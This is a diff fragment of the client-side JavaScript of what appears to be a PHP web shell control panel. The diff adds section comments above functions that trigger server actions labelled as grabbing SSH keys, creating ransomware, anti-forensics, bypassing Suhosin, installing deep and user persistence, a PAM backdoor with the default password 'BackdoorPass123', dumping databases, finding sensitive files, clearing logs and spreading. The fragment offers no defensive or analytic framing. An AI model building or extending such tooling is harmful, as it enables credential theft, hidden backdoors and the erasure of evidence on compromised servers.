                 } 
             }
             
+            // ===== SSH KEYS =====
             function runSSHKeys(){ if(confirm('Grab SSH keys?')){ fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== WP SCAN =====
             function runWPScan(){ if(confirm('Scan WordPress/Laravel?')){ fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== RANSOMWARE =====
             function runCreateRansom(){ if(confirm('Create ransomware?')){ fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== ANTI FORENSIC =====
             function runAntiForensic(){ if(confirm('Anti forensic?')){ fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== BYPASS SUHOSIN =====
             function runBypassSuhosin(){ if(confirm('Bypass Suhosin?')){ fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== CREATE FTP =====
             function runCreateFTP(){ 
                 var u=prompt('Username:'); 
                 if(u){ 
@@ -2859,6 +3053,7 @@ if (isset($_SESSION['loggedin'])) {
                 } 
             }
             
+            // ===== CREATE MAIL =====
             function runCreateMail(){ 
                 var e=prompt('Email:'); 
                 if(e){ 
@@ -2867,11 +3062,13 @@ if (isset($_SESSION['loggedin'])) {
                 } 
             }
             
+            // ===== DEEP PERSISTENCE =====
             function runDeepPersistence(action){ 
                 var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?'; 
                 if(confirm(msg)){ fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
             }
             
+            // ===== PAM BYPASS =====
             function runPamBypass(action){ 
                 if(action==='install'){ 
                     var pass=prompt('Backdoor password:')||'BackdoorPass123'; 
@@ -2881,17 +3078,22 @@ if (isset($_SESSION['loggedin'])) {
                 } 
             }
             
+            // ===== USER PERSISTENCE =====
             function runUserPersistence(action){ 
                 var msg=action==='install'?'Install user persistence?':'Remove user persistence?'; 
                 if(confirm(msg)){ fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
             }
             
+            // ===== DUMP DB =====
             function runDump(){ if(confirm('Dump database?')){ fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== CONFIG FINDER =====
             function runConfigFinder(){ if(confirm('Find sensitive files?')){ fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== CLEAR LOGS =====
             function runClearLogs(){ if(confirm('Clear logs?')){ fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
             
+            // ===== LIST SPREAD =====
             function runListSpread(){ fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); }
 
             window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
